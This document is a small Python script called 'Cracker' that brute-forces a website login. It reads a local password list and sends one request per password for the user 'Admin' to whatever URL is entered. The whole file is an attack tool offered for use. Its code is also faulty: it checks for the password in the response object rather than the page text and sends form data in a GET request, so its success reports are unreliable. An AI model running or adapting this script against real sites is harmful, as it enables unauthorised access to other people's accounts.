#!/usr/bin/python3
# This write by Mr.nope
# Version 1.2.0
import os
import socket
import sys
import time
import platform
import requests
ip = "\nhttps://"
system = platform.uname()[0]
def cls():
    if system == 'Linux':
        os.system("clear")
    elif system == 'Windows':
        os.system("cls")
    else:
        print("\nSorry, Please Run This Programm on Windows or Linux,Mac!\n")
        sys.exit()
a = open("passlist.txt","r").read().split()
def main():
    os.system("printf '\033]2;Cracker\a'")
    cls()
    print("\nPlease, Check Passlist to change password!\n\nPlease, Enter Url!\n")
    host = input(ip)
    print('\nUsage: Ctrl + D To Exit!\n')
    time.sleep(1)
    print("-------------------------------------------------\n")
    host_ip = socket.gethostbyname(host)
    print(f'IP: {host_ip}\n')
    time.sleep(3)
    for passwd in a:
        web = requests.get(f"https://{host}",data={"user":"Admin","password":passwd})
        if passwd in web:
            print(f'Password {passwd} Open!')
        else:
            print(f'Password {passwd} Filter!')
    try1()
def try1():
    try_to_main = input("\npress Enter, To Back Main Menu...")
    if try_to_main == '':
        main()
    else:
        main()
if sys.version_info < (3,0):
    print("\nPlease, Usage: python3 crack.py !\n")
    sys.exit()
else:
    try:
        try:
            main()
        except EOFError:
            print("\nCtrl + D")
            print("\nExiting...")
            sys.exit()
    except KeyboardInterrupt:
        print("\nCtrl + C")
        print("\nStop Cracking...!\n")
        try1()
if __name__ == '__main__':
    try:
        try:
            main()
        except EOFError:
            print("\nCtrl + D")
            print("\nExiting...")
            sys.exit()
    except KeyboardInterrupt:
        print("\nCtrl + C")
        print("\nStop Cracking...!")
        try1()